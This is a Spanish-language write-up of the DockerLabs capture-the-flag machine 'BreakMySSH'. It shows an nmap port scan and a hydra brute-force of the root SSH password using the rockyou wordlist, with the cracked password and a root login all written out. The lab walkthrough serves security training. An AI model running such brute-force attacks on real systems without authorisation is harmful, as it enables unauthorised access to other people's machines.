<section align="center">

# 💥BreakMySSH Write Up💥

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Facil-green?style=for-the-badge)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)

</section>

## 🚀 Despliegue

Una vez descargado el ctf, lo extreamos y accedemos a su respectiva carpeta desde la terminal, luego iniciamos la maquina con:

```bash
sudo bash auto_deploy.sh breakmyssh.tar
```

## 🔍Escaneo y enumeracion

para empezar con el ctf, realizamos un escaneo general con nmap:

```bash
nmap -p- 172.17.0.3
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p-`** | indico que quiero un escaneo para todos los puertos |

nos devuelve esto:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-08 18:18 -03
Nmap scan report for 172.17.0.3
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
```

al realizar ese escaneo, podemos ver el puerto 22 esta abierto, como no sabemos ni tenemos idea sobre que usuario podria tener configurado, tenemos dos opciones, agarrar un diccionario de usuarios y usarlo junto a otro de contraseña en hydra, otra opcion es intentar manualmente unos usuarios comunes, intentaremos esta segunda opcion:

```bash
hydra -l root -P rockyou.txt 172.17.0.3 ssh
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-l`** | indico que se el usuario que sera usado para el ataque |
| **`-P`** | indico que no se la contraseña para el ataque y que usare un diccionario con muchas contraseñas|

y nos devuelve:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 18:25:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-08 18:26:30
```

gracias ese intento, pudimos obtener un usuario y contraseña

## ☠️Explotacion

ahora, nos conectamos por ssh:

```bash
ssh root@172.17.0.3
```

nos devuelve:

```bash
The authenticity of host '172.17.0.3 (172.17.0.3)' can't be established.
ED25519 key fingerprint is SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.
root@172.17.0.3's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

al escribir la contraseña obtenida obtendremos acceso como usuario root, dando por finalizada la ctf
